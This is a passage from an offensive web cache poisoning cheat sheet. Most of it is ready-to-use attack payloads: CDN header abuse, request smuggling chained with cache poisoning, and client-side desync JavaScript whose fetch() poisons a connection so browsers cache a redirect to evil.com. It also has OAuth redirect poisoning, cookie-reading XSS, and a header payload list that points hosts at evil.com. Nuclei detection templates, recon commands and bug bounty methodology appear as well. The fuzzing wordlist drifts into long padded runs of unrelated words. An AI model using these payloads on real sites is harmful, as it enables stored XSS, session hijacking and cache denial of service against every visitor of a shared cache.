CF-Connecting-IP: 127.0.0.1
```

### 11.2 Fastly-Specific

**VCL Logic Abuse**:
```http
GET / HTTP/1.1
Host: target.com
Fastly-Client-IP: 127.0.0.1
Fastly-FF: enable_debug
```

**Fastly Internal Headers**:
```http
X-Fastly-Debug: 1
Fastly-Debug: 1
Fastly-Debug-Digest: test
```

### 11.3 Akamai-Specific

**EdgeSuite Headers**:
```http
X-Akamai-Edgescape: test
X-Akamai-Request-BC: test
Akamai-Origin-Hop: 999
```

### 11.4 AWS CloudFront-Specific

**Signed URL Abuse**:
```
https://target.com/file?Expires=...&Signature=...&Key-Pair-Id=...
```

**Origin Access Identity Bypass**:
```http
GET /s3-bucket/private-file HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```

### 11.5 CDN Internal Route Poisoning

```http
GET / HTTP/1.1
Host: target.com
X-Ama-Website-Redirect-Location: evil.com
X-Aman-CDN-Cache: poison
Fastly-Soc-X-Request-ID: malicious
```

---

## 12. Browser-Powered Desync + Cache Poisoning Chains

### 12.1 Client-Side Desync Fundamentals

Client-side desync (CL.0) occurs when a server ignores Content-Length and processes the body as a new request.

**Detection**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 50

GET /404 HTTP/1.1
X: X
```

If the server responds to the smuggled request, it's vulnerable.

### 12.2 Cache Poisoning via Client-Side Desync

**Step 1: Poison Socket**
```javascript
fetch('https://target.com/', {
    method: 'POST',
    body: "GET /post/next?postId=3 HTTP/1.1\r\nHost: evil.com\r\nContent-Length: 10\r\n\r\nx=1",
    credentials: 'include'
}).catch(() => {});
```

**Step 2: Navigate to Target Resource**
```javascript
location = 'https://target.com/resources/js/tracking.js';
```

The browser reuses the poisoned socket, gets a redirect to evil.com, and caches the redirect.

### 12.3 JavaScript Resource Poisoning Chain

```javascript
// 1. Poison the socket with a Host-header redirect
fetch('https://target.com/', {
    method: 'POST',
    body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
    credentials: 'include'
}).catch(() => {
    // 2. Navigate to JS resource to poison browser cache
    location = 'https://target.com/+CSCOE+/win.js'
});
```

### 12.4 Polyglot Payload for Redirect + JS

Serve both redirect and JS from same endpoint:
```javascript
// Polyglot: valid as both redirect target and JS
HTTP/1.1 302 Found
Location: https://evil.com/final.js
Content-Type: text/javascript

alert(document.cookie);
```

### 12.5 Browser Cache Partitioning Bypass

**Note**: Modern browsers partition HTTP cache by top-level site. To bypass:
1. Use top-level navigation (not fetch/XHR)
2. Exploit same-origin redirects
3. Abuse Service Worker cache API

---

## 13. Request Smuggling + Cache Poisoning Chains

### 13.1 CL.TE to Cache Poisoning

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

Then request:
```http
GET /resources/js/tracking.js HTTP/1.1
Host: target.com
```

The smuggled request causes a redirect that gets cached for `tracking.js`.

### 13.2 TE.CL to Cache Poisoning

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5
GPOST / HTTP/1.1

0

```

### 13.3 HTTP/2 Downgrade to Cache Poisoning

```http
:method POST
:path /
:authority target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com
```

When downgraded to HTTP/1.1, the body becomes a smuggled request.

### 13.4 Request Smuggling to CPDoS

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 129
Transfer-Encoding: chunked

0

GET /400badrequest HTTP/1.1
X-Ignore: x
```

Then request cacheable endpoint:
```http
GET /assets/main.js HTTP/1.1
Host: target.com
```

Backend sees:
```
GET /400badrequest HTTP/1.1
X-Ignore: xGET /assets/main.js HTTP/1.1
Host: target.com
```

Returns 400, which gets cached for `/assets/main.js`.

### 13.5 Header Smuggling to Cache Poisoning

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET / HTTP/1.1
X: X
Host: evil.com
```

---

## 14. OAuth + Cache Poisoning Chains

### 14.1 OAuth Redirect URI Poisoning

```http
GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/callback HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

The authorization server uses `X-Forwarded-Host` to construct the redirect URI, which gets cached.

### 14.2 OAuth State Parameter Cache Poisoning

```http
GET /oauth/authorize?state=CANARY_XSS HTTP/1.1
Host: target.com
```

If `state` is reflected in the response without being keyed, it can be poisoned.

### 14.3 OpenID Connect ID Token Cache Poisoning

```http
GET /openid/connect?nonce=<script>alert(1)</script> HTTP/1.1
Host: target.com
```

### 14.4 OAuth Token Endpoint Cache Poisoning

```http
POST /oauth/token HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=xxx&redirect_uri=https://evil.com
```

---

## 15. Service Worker + Cache Poisoning Chains

### 15.1 Service Worker Registration Poisoning

```javascript
// Attacker-controlled JS that registers a malicious SW
navigator.serviceWorker.register('/sw.js').then(registration => {
    console.log('SW registered');
});
```

### 15.2 Cache API Abuse

```javascript
// In service worker
self.addEventListener('fetch', event => {
    event.respondWith(
        caches.open('poisoned-v1').then(cache => {
            return cache.match(event.request).then(response => {
                if (response) return response;
                return fetch(event.request).then(networkResponse => {
                    cache.put(event.request, networkResponse.clone());
                    return networkResponse;
                });
            });
        })
    );
});
```

### 15.3 SW Scope Manipulation

```javascript
// Register SW with broad scope
navigator.serviceWorker.register('/sw.js', {
    scope: '/'
});
```

### 15.4 Cache Poisoning via SW Update

```javascript
// Force SW update to install new poisoned cache
registration.update();
```

---

## 16. Parser Confusion Payloads

### 16.1 Content-Length vs Transfer-Encoding

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

### 16.2 Chunked Encoding Confusion

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5

hello

0



GET /admin HTTP/1.1

Host: target.com



```

### 16.3 Header Parsing Discrepancies

```http
GET / HTTP/1.1
Host: target.com
Content-Length: 5
Content-Length: 50

12345
```

Some servers use first, some use last.

### 16.4 Line Ending Confusion

```http
GET / HTTP/1.1

Host: target.com


```

vs

```http
GET / HTTP/1.1

Host: target.com


```

### 16.5 Character Set Confusion

```http
GET / HTTP/1.1
Host: target.com
Transfer-Encoding: chun\x00ked
```

### 16.6 HTTP/2 Pseudo-Header Confusion

```
:authority target.com

:path /

:scheme https

:method GET

host evil.com

```

---

## 17. Browser Quirks

### 17.1 Chrome Behaviors

- **Cache Partitioning**: By top-level site + frame origin + URL
- **Back/Forward Cache (bfcache)**: Caches full page state
- **Service Worker Cache**: Separate from HTTP cache
- **Prefetch Cache**: Can be poisoned via `<link rel="prefetch">`

### 17.2 Firefox Behaviors

- **Cache Partitioning**: By top-level site
- **HTTP Strict Transport Security (HSTS)**: Can be manipulated via cache
- **DNS Prefetch**: `<link rel="dns-prefetch">` can leak info

### 17.3 Safari Behaviors

- **Intelligent Tracking Prevention**: Affects cache behavior
- **Cross-Site Tracking**: Limited cache sharing

### 17.4 Cache Busting Techniques

```http
# Standard cache busters
GET /?cb=1234567890 HTTP/1.1
GET /?t=1234567890 HTTP/1.1
GET /?_=1234567890 HTTP/1.1
GET /?v=1234567890 HTTP/1.1
GET /?r=1234567890 HTTP/1.1
GET /?nocache=1 HTTP/1.1
```

### 17.5 User-Agent Targeting

```http
# Target specific browsers (if User-Agent is keyed)
GET / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

---

## 18. Gadget Chains

### 18.1 Host Header Gadgets

**Gadget 1: URL Construction**
```python
# Django/Rails pattern
url = request.scheme + "://" + request.get_host() + path
```

**Gadget 2: Password Reset Links**
```python
reset_url = "https://" + request.META.get('HTTP_X_FORWARDED_HOST', request.get_host()) + "/reset/" + token
```

**Gadget 3: Open Graph Meta Tags**
```html
<meta property="og:url" content="https://{{ request.headers.X-Forwarded-Host }}/page">
```

**Gadget 4: Script Sources**
```html
<script src="https://{{ request.headers.X-Forwarded-Host }}/static/app.js"></script>
```

**Gadget 5: Stylesheet Links**
```html
<link rel="stylesheet" href="https://{{ request.headers.X-Forwarded-Host }}/static/style.css">
```

**Gadget 6: Base HREF**
```html
<base href="https://{{ request.headers.X-Forwarded-Host }}/">
```

**Gadget 7: API Endpoints**
```javascript
const API_BASE = "https://" + (headers['X-Forwarded-Host'] || location.host);
```

### 18.2 Cookie Gadgets

**Gadget 1: Tracking Cookie Reflection**
```javascript
var trackingDomain = document.cookie.match(/tracking=([^;]+)/)[1];
document.write('<img src="https://' + trackingDomain + '/pixel.gif">');
```

**Gadget 2: Session Cookie in Response**
```http
Set-Cookie: session={{ cookie.value }}; Domain={{ X-Forwarded-Host }}
```

### 18.3 Parameter Gadgets

**Gadget 1: UTM Parameter Reflection**
```html
<script>
var campaign = "{{ request.args.utm_source }}";
</script>
```

**Gadget 2: Callback Parameter (JSONP)**
```javascript
{{ request.args.callback }}({"data": "value"});
```

### 18.4 Error Page Gadgets

**Gadget 1: 404 Page Reflection**
```html
<h1>404 - {{ request.path }} not found</h1>
```

**Gadget 2: 500 Error Details**
```html
<p>Error at: {{ request.headers.Host }}</p>
```

---

## 19. Real World Case Studies

### 19.1 Cloudflare + Discord (2019)

**Vulnerability**: X-Forwarded-Host header poisoning
**Impact**: XSS on discord.com
**Details**: Cloudflare did not include X-Forwarded-Host in cache key. Discord reflected it in Open Graph tags.

### 19.2 Ruby on Rails Applications

**Vulnerability**: `url_for()` using `X-Forwarded-Host`
**Impact**: Open redirect + cache poisoning
**Details**: Rails `request.host` prioritizes `X-Forwarded-Host` over `Host` header.

### 19.3 Cisco ASA WebVPN (2022)

**Vulnerability**: Client-side desync + cache poisoning
**Impact**: JavaScript execution in VPN context
**Details**: Browser-powered desync allowed poisoning browser cache for VPN JS resources.

### 19.4 Basecamp (HackerOne #919175)

**Vulnerability**: HTTP request smuggling to cache poisoning
**Impact**: Web cache poisoning on Basecamp 2
**Details**: Request smuggling allowed injecting responses into the cache.

### 19.5 Craft CMS (CVE-2024-46452)

**Vulnerability**: Host Header Injection in password reset
**Impact**: Password reset token theft + cache poisoning
**Details**: `X-Forwarded-Host` used to construct reset emails without validation.

### 19.6 Dell ECS (DSA-2024-331)

**Vulnerability**: Host Header Injection
**Impact**: XSS, cache poisoning, session hijacking
**Details**: Elastic Cloud Storage Management API vulnerable to Host header manipulation.

### 19.7 IBM SmartCloud Analytics (CVE-2024-40686)

**Vulnerability**: Host Header Injection
**Impact**: Cross-site scripting, cache poisoning, session hijacking
**Details**: Improper Host header validation in analytics platform.

### 19.8 Ratpack Framework (GHSA-w6rq-6h34-vh7q)

**Vulnerability**: Cached redirect poisoning via X-Forwarded-Host
**Impact**: Redirect cache poisoning
**Details**: Default `PublicAddress` inferred from request context, vulnerable to cache poisoning.

---


### 20.2 Parameter Name Fuzzing

```
admin
administrator
root
superuser
system
debug
test
testing
staging
dev
development
production
prod
live
api
internal
external
public
private
secret
hidden
invisible
ghost
shadow
backup
archive
copy
clone
mirror
replica
version
revision
build
release
deploy
install
update
upgrade
patch
fix
change
modify
alter
edit
create
make
new
add
insert
append
prepend
remove
delete
drop
clear
empty
purge
flush
reset
restore
recover
repair
heal
fix
solve
resolve
answer
respond
reply
return
callback
hook
trigger
action
handler
listener
observer
watcher
monitor
detector
sensor
probe
scanner
analyzer
processor
transformer
converter
translator
interpreter
parser
compiler
builder
generator
creator
maker
producer
manufacturer
fabricator
constructor
developer
designer
architect
engineer
programmer
coder
hacker
cracker
breaker
destroyer
wrecker
ruiner
damager
harmer
hurter
injurer
wounder
killer
murderer
assassin
executioner
slayer
destroyer
annihilator
eliminator
eradicator
exterminator
extirpator
obliterator
vanquisher
conqueror
defeater
overcomer
surpasser
exceeder
transcender
outdoer
outperformer
outachiever
overachiever
winner
victor
champion
hero
leader
master
expert
specialist
professional
practitioner
operator
user
consumer
client
customer
patron
guest
visitor
traveler
tourist
explorer
adventurer
pioneer
settler
colonist
inhabitant
resident
citizen
national
subject
person
people
population
crowd
mass
mob
group
team
crew
squad
unit
force
army
troop
soldier
warrior
fighter
combatant
belligerent
opponent
enemy
adversary
foe
rival
competitor
contender
challenger
```

### 20.3 Static Extension Fuzzing

```
.js
.css
.ico
.png
.jpg
.jpeg
.gif
.svg
.woff
.woff2
.ttf
.eot
.otf
.html
.htm
.txt
.xml
.json
.pdf
.doc
.docx
.xls
.xlsx
.ppt
.pptx
.zip
.tar
.gz
.bz2
.7z
.rar
.exe
.dll
.bin
.dat
.db
.sql
.log
.tmp
.temp
.bak
.backup
.old
.orig
.swf
.flv
.mp4
.mp3
.avi
.mov
.wmv
.mkv
.webm
.wav
.ogg
.oga
.ogv
.ogx
.spc
.cer
.crt
.pem
.key
.p12
.pfx
.der
.crl
.ocsp
.csr
```

### 20.4 Delimiter Fuzzing

```
;
%3b
#
%23
?
%3f
&
%26
=
%3d
/
%2f
..
%2e%2e
%252e%252e
..
%2e.
.%2e
%252e.
.%252e
%252e%252e
%252f
%252F
%25%32%66
%25%32%46
%uff0e%uff0e
%u002e%u002e
%u002f
%u002F
0x2e0x2e
0x2f
0x2F
\x2e\x2e
\x2f
\x2F
\u002e\u002e
\u002f
\u002F
\x{002e}\x{002e}
\x{002f}
\x{002F}
```

### 20.5 HTTP Method Fuzzing

```
GET
POST
PUT
DELETE
PATCH
HEAD
OPTIONS
TRACE
CONNECT
PROPFIND
PROPPATCH
MKCOL
COPY
MOVE
LOCK
UNLOCK
VERSION-CONTROL
REPORT
CHECKOUT
CHECKIN
UNCHECKOUT
MKWORKSPACE
UPDATE
LABEL
MERGE
BASELINE-CONTROL
MKACTIVITY
ORDERPATCH
ACL
SEARCH
NOTIFY
SUBSCRIBE
UNSUBSCRIBE
BMOVE
BCOPY
BDELETE
BPROPFIND
BPROPPATCH
POLL
NONSENSE
INVALID
FOO
BAR
BAZ
TEST
DEBUG
ADMIN
```

---

## 21. Automation Workflows

### 21.1 Manual Testing Workflow

```
Step 1: Identify Caching Behavior
  - Check Cache-Control headers
  - Look for X-Cache, CF-Cache-Status, Age headers
  - Test with cache-buster parameter
  - Confirm cache hit/miss behavior

Step 2: Identify Unkeyed Inputs
  - Use Param Miner to guess headers
  - Test common unkeyed headers manually
  - Check for parameter reflection
  - Verify inputs are not in Vary header

Step 3: Test Reflection
  - Inject canary value into unkeyed input
  - Check if canary appears in response
  - Test in different contexts (HTML, JS, URL, CSS)

Step 4: Craft Poisoning Payload
  - Based on reflection context, craft XSS/redirect/DoS payload
  - Use cache-buster to limit impact during testing
  - Send poisoning request

Step 5: Verify Poisoning
  - Remove cache-buster
  - Send normal request
  - Confirm poisoned response is served
  - Check cache indicators (X-Cache: hit)

Step 6: Assess Impact
  - XSS: Execute script in victim context
  - Redirect: Redirect victims to evil site
  - DoS: Cache error response
  - Data Theft: Cache deception for sensitive data
```

### 21.2 Automated Scanning Workflow

```bash
# Step 1: Discover URLs
katana -u https://target.com -o urls.txt

# Step 2: Check cache behavior
for url in $(cat urls.txt); do
    curl -s -o /dev/null -w "%{http_code} %{size_download} %{url_effective}\n" "$url"
    curl -s -o /dev/null -w "%{http_code} %{size_download} %{url_effective}\n" "$url"
done

# Step 3: Run WCVS
wcvs -u https://target.com -r 3 -gr

# Step 4: Run Nuclei cache templates
nuclei -u https://target.com -t nuclei-templates/http/misconfiguration/cache/

# Step 5: Run Param Miner in Burp
# Right-click request -> Guess headers
# Right-click request -> Guess cookies
# Right-click request -> Guess params

# Step 6: Check for request smuggling
# Use HTTP Request Smuggler extension in Burp
# Launch smuggle probe on cacheable endpoints
```

### 21.3 CI/CD Integration

```yaml
# .github/workflows/cache-poisoning-scan.yml
name: Cache Poisoning Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install WCVS
        run: |
          wget https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner/releases/latest/download/wcvs-linux-amd64
          chmod +x wcvs-linux-amd64
      - name: Run Scan
        run: |
          ./wcvs-linux-amd64 -u https://staging.target.com -gr -gp ./reports
      - name: Upload Report
        uses: actions/upload-artifact@v3
        with:
          name: wcvs-report
          path: ./reports/
```

---

## 22. Recon Methodology

### 22.1 Cache Detection

```bash
# Check for cache headers
curl -I https://target.com | grep -i "cache\|age\|x-cache\|cf-cache"

# Test cache behavior
curl -s https://target.com > response1.html
curl -s https://target.com > response2.html
diff response1.html response2.html

# Check cache with cache-buster
curl -s "https://target.com?cb=$(date +%s)" > response3.html
diff response1.html response3.html
```

### 22.2 CDN Detection

```bash
# Identify CDN
host target.com
nslookup target.com
dig target.com

# Check CDN-specific headers
curl -I https://target.com | grep -i "cloudflare\|fastly\|akamai\|cloudfront\|cdn"

# Use cdncheck
cdncheck -i target.com
```

### 22.3 Technology Fingerprinting

```bash
# Identify framework
whatweb https://target.com
wappalyzer https://target.com

# Check for known vulnerable patterns
# Rails: X-Forwarded-Host reflected in url_for()
# Django: X-Forwarded-Host in request.build_absolute_uri()
# Laravel: X-Forwarded-* headers trusted by default
# Express: trust proxy setting enables X-Forwarded-*
```

### 22.4 Cache Key Analysis

```bash
# Test what affects cache key
# Send request with different headers
curl -s -H "User-Agent: A" https://target.com > ua_a.html
curl -s -H "User-Agent: B" https://target.com > ua_b.html
diff ua_a.html ua_b.html

# Test Accept-Encoding
curl -s -H "Accept-Encoding: gzip" https://target.com > enc_gzip.html
curl -s -H "Accept-Encoding: identity" https://target.com > enc_identity.html
diff enc_gzip.html enc_identity.html

# Test cookies
curl -s -b "test=value1" https://target.com > cookie1.html
curl -s -b "test=value2" https://target.com > cookie2.html
diff cookie1.html cookie2.html
```

### 22.5 Vulnerable Endpoint Discovery

```bash
# Find cacheable endpoints
# Static resources
curl -I https://target.com/static/app.js
curl -I https://target.com/css/style.css
curl -I https://target.com/img/logo.png

# API endpoints with cache headers
curl -I https://target.com/api/public/data

# Check if error pages are cached
curl -I https://target.com/nonexistent
```

---

## 23. Nuclei Templates

### 23.1 Basic Cache Poisoning Detection

```yaml
id: cache-poisoning

info:
  name: Cache Poisoning
  author: melbadry9 & xelkomy
  severity: low
  reference:
    - https://portswigger.net/research/practical-web-cache-poisoning
  tags: cache,generic

requests:
  - raw:
      - |
        GET /?mel=9 HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Prefix: cache.{{interactsh-url}}
        X-Forwarded-Host: cache.{{interactsh-url}}
        X-Forwarded-For: cache.{{interactsh-url}}

      - |
        GET /?mel=9 HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "cache.") == true'
```

### 23.2 Cache Poisoning Stored XSS

```yaml
id: cache-poisoning-stored-xss

info:
  name: Cache Poisoning Based Stored XSS
  author: melbadry9, xelkomy, akincibor
  severity: high
  reference:
    - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
    - https://portswigger.net/research/practical-web-cache-poisoning
  tags: cache,xss,generic

requests:
  - raw:
      - |
        GET /?test=1337 HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Prefix: cache.{{interactsh-url}}"></script><script>alert(document.domain);</script>
        X-Forwarded-Host: cache.{{interactsh-url}}"></script><script>alert(document.domain);</script>
        X-Forwarded-For: cache.{{interactsh-url}}"></script><script>alert(document.domain);</script>

      - |
        GET /?test=1337 HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "cache.")'
```

### 23.3 Cache Deception Detection

```yaml
id: cache-deception

info:
  name: Cache Deception
  author: custom
  severity: medium
  tags: cache,deception

requests:
  - raw:
      - |
        GET /my-account;.js HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie}}

      - |
        GET /my-account;.js HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "account") || contains(body_2, "profile") || contains(body_2, "settings")'
```

### 23.4 CPDoS Detection

```yaml
id: cpdos-cache-poisoning

info:
  name: CPDoS - Cache Poisoned Denial of Service
  author: custom
  severity: medium
  tags: cache,cpdos,dos

requests:
  - raw:
      - |
        GET /?cb=1337 HTTP/1.1
        Host: {{Hostname}}
        X-HTTP-Method-Override: NONSENSE

      - |
        GET /?cb=1337 HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 >= 400 && status_code_1 < 500'
          - 'status_code_2 == status_code_1'
        condition: and
```

### 23.5 Web Cache Entanglement

```yaml
id: cache-entanglement

info:
  name: Web Cache Entanglement
  author: custom
  severity: medium
  reference:
    - https://portswigger.net/research/web-cache-entanglement
  tags: cache,entanglement

requests:
  - raw:
      - |
        GET /api/users/../users?cb=1337 HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Host: entangle.{{interactsh-url}}

      - |
        GET /api/users?cb=1337 HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "entangle.")'
```

### 23.6 Fat GET Detection

```yaml
id: fat-get-cache-poisoning

info:
  name: Fat GET Cache Poisoning
  author: custom
  severity: medium
  tags: cache,fat-get

requests:
  - raw:
      - |
        GET /?cb=1337 HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 31

        GET / HTTP/1.1
        X: 1

      - |
        GET /?cb=1337 HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 != status_code_2 || body_1 != body_2'
```

---

## 24. Tools and Scanners

### 24.1 Web Cache Vulnerability Scanner (WCVS)

**Installation**:
```bash
# Kali Linux
apt install web-cache-vulnerability-scanner

# Go install
go install -v github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest

# Docker
docker run -it hackmanit/wcvs --help
```

**Usage**:
```bash
# Basic scan
wcvs -u https://target.com

# With custom wordlists
wcvs -u https://target.com -hw headers.txt -pw params.txt

# With crawling
wcvs -u https://target.com -r 5 -rl 10

# With proxy (Burp)
wcvs -u https://target.com -up -purl http://127.0.0.1:8080

# Generate report
wcvs -u https://target.com -gr -gp ./reports

# Custom cache header
wcvs -u https://target.com -ch "X-Custom-Cache"

# Rate limiting
wcvs -u https://target.com -rr 10

# Thread control
wcvs -u https://target.com -t 50
```

**Supported Techniques**:
1. Unkeyed header poisoning
2. Unkeyed parameter poisoning
3. Parameter cloaking
4. Fat GET
5. HTTP response splitting
6. HTTP request smuggling
7. HTTP header oversize (HHO)
8. HTTP meta character (HMC)
9. HTTP method override (HMO)
10. Parameter pollution
11. Path parameter cache deception
12. Path traversal cache deception
13. Appended special characters cache deception

### 24.2 Param Miner (Burp Extension)

**Installation**:
- BApp Store in Burp Suite
- Requires Burp Suite 2021.9+

**Usage**:
```
1. Right-click request in Proxy/HTTP history
2. Select "Guess headers" / "Guess cookies" / "Guess params"
3. Check Extender > Extensions > Param Miner > Output
4. Or check Dashboard for scanner issues (Pro)
```

**Features**:
- Binary search for parameter discovery
- 65,000+ parameter names per request
- Automatic cache-buster insertion
- Fat GET detection
- Web cache entanglement detection

### 24.3 HTTP Request Smuggler (Burp Extension)

**Installation**:
- BApp Store in Burp Suite

**Usage**:
```
1. Right-click request
2. "Launch Smuggle probe"
3. Check Organizer and extension output
4. Right-click chunked request -> "Launch Smuggle attack"
```

**Features**:
- CL.TE and TE.CL detection
- HTTP/2 desync detection
- Client-side desync detection
- Header smuggling detection
- Connection state manipulation
- Turbo Intruder integration

### 24.4 Nuclei Templates

**Cache-Related Templates**:
```bash
# Run all cache templates
nuclei -u https://target.com -t nuclei-templates/http/misconfiguration/cache/

# Specific templates
nuclei -u https://target.com -t cache-poisoning.yaml
nuclei -u https://target.com -t cache-deception.yaml
nuclei -u https://target.com -t cpdos.yaml
```

### 24.5 Additional Tools

**cdncheck**:
```bash
cdncheck -i target.com
cdncheck -l domains.txt
```

**httpx**:
```bash
# Probe for cache headers
httpx -u target.com -probe -tech-detect

# Mass probing
cat domains.txt | httpx -probe -tech-detect -o output.txt
```

**katana**:
```bash
# Crawl for URLs
katana -u https://target.com -o urls.txt

# Headless crawling
katana -u https://target.com -headless -o urls.txt
```

**burp collaborator / interactsh**:
```bash
# For out-of-band detection
interactsh-client
```

---

## 25. Advanced Research

### 25.1 HTTP/1.1 Must Die - Desync Endgame (2025)

Key findings from James Kettle's latest research:
- Parser discrepancy detection bypasses widespread desync defenses
- HTTP/1.1 remains fundamentally broken for security
- HTTP/2-only stacks eliminate most desync vectors
- Connection state attacks remain viable

### 25.2 Web Cache Entanglement (2020)

Key findings:
- Keyed components can be manipulated through normalization
- Path normalization discrepancies between cache and origin
- Query string parameter stripping creates entanglement
- Method override can poison GET cache entries with DELETE responses

### 25.3 Browser-Powered Desync (2022)

Key findings:
- CL.0 desync: Server ignores Content-Length on POST
- Client-side cache poisoning via browser cache
- JavaScript resource poisoning chains
- Top-level navigation bypasses cache partitioning
- Polyglot payloads for redirect + JS execution

### 25.4 Practical Web Cache Poisoning (2018)

Key findings:
- Unkeyed header exploitation
- Param Miner tool introduction
- 30+ exploitable headers identified
- Cache key internals of major CDNs
- Real-world exploitation chains

### 25.5 CPDoS Research

Key findings:
- Oversized headers cause 400 errors that get cached
- Malformed Range headers cause errors
- Invalid Authorization headers cause 401/403 caching
- Method override causes 405 caching
- HTTP/2 specific CPDoS vectors

### 25.6 HCache - Large Scale Measurement (2024)

Key findings:
- 14 types of attack vectors identified
- 7 new attack vectors discovered
- Internal Route Header attacks affect 234+ websites
- HTTP Authentication Header attacks affect 118+ websites
- HTTP Protocol Header attacks affect 69+ websites
- Range Header attacks affect 46+ websites

---

## 26. Bug Bounty Writeups

### 26.1 Methodology for Bug Bounty

```
1. Scope Enumeration
   - Use bbscope to get scope from HackerOne/Bugcrowd/Intigriti
   - Filter for high-traffic endpoints
   - Identify CDN usage

2. Cache Detection
   - Check all in-scope URLs for caching
   - Identify cacheable endpoints
   - Map CDN behavior

3. Unkeyed Input Discovery
   - Run Param Miner on all cacheable endpoints
   - Test manually with common headers
   - Check for parameter reflection

4. Exploitation
   - Craft XSS payload if reflection in HTML
   - Craft redirect if reflection in URL
   - Craft CPDoS if error triggered
   - Chain with other vulnerabilities

5. Impact Assessment
   - Can affect all users?
   - Can steal sensitive data?
   - Can achieve account takeover?
   - Can bypass authentication?

6. Report Writing
   - Clear reproduction steps
   - Video/GIF demonstration
   - Impact explanation
   - Suggested fix
```

### 26.2 Common Bounty Payouts

| Vulnerability Type | Severity | Typical Payout Range |
|-------------------|----------|---------------------|
| Cache Poisoning XSS | High | $1,000 - $5,000 |
| Cache Poisoning Redirect | Medium | $500 - $2,000 |
| CPDoS | Medium | $500 - $3,000 |
| Cache Deception (Data Theft) | High | $2,000 - $10,000 |
| Request Smuggling + Cache Poisoning | Critical | $5,000 - $20,000 |
| Client-Side Desync + Cache Poisoning | Critical | $5,000 - $15,000 |

### 26.3 Report Templates

**Cache Poisoning XSS Report**:
```
Title: Web Cache Poisoning to Stored XSS on [Endpoint]

Summary:
The [Endpoint] endpoint is vulnerable to web cache poisoning via the 
[X-Forwarded-Host/X-Custom-Header] header. This unkeyed input is reflected 
in the response without proper sanitization, allowing an attacker to inject 
a stored XSS payload that will be served to all users accessing the cached resource.

Steps to Reproduce:
1. Send the following request:
   GET /[endpoint] HTTP/1.1
   Host: [target.com]
   [Unkeyed-Header]: [XSS-Payload]

2. Observe that the response contains the XSS payload and is cached (X-Cache: hit)

3. Send a normal request to /[endpoint] without the header

4. Observe that the XSS payload is still served (stored XSS)

Impact:
- All users accessing [Endpoint] will execute the attacker's JavaScript
- Potential for session hijacking, credential theft, and account takeover
- Affects [X] users based on cache duration and traffic

Suggested Fix:
- Include [Unkeyed-Header] in the cache key (Vary header)
- Sanitize all reflected inputs
- Disable caching for dynamic content
```

---

## 27. Payload Collections

### 27.1 Complete Header Payload List

```
# Host-related
Host: evil.com
Host: target.com.evil.com
Host: evil.com:443
Host: target.com:@evil.com
Host: target.com?evil.com
Host: target.com/evil.com
Host: target.com\evil.com
Host: target.com@evil.com

# X-Forwarded headers
X-Forwarded-Host: evil.com
X-Forwarded-Host: evil.com:443
X-Forwarded-Host: evil.com/path
X-Forwarded-Host: a."><script>alert(1)</script>
X-Forwarded-Host: evil.com\x00target.com
X-Forwarded-Host: evil.com\ntarget.com
X-Forwarded-Host: evil.com\rtarget.com
X-Forwarded-Host: evil.com\r\ntarget.com
X-Forwarded-For: evil.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: ::1
X-Forwarded-For: 0:0:0:0:0:0:0:1
X-Forwarded-Proto: http
X-Forwarded-Proto: ftp
X-Forwarded-Proto: evil.com
X-Forwarded-Scheme: http
X-Forwarded-Scheme: nothttps
X-Forwarded-Port: 80
X-Forwarded-Port: 443
X-Forwarded-Port: 8080
X-Forwarded-Port: 3000
X-Forwarded-Server: evil.com
X-Forwarded-Ssl: off

# Method override
X-HTTP-Method-Override: DELETE
X-HTTP-Method-Override: PUT
X-HTTP-Method-Override: PATCH
X-HTTP-Method-Override: TRACE
X-HTTP-Method-Override: OPTIONS
X-HTTP-Method-Override: CONNECT
X-HTTP-Method-Override: NONSENSE
X-HTTP-Method: DELETE
X-Method-Override: DELETE

# URL rewrite
X-Original-URL: /admin
X-Original-URL: /api/internal
X-Rewrite-URL: /admin
X-Rewrite-URL: /api/internal
X-Original-Host: evil.com

# IP spoofing
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Client-Address: 127.0.0.1
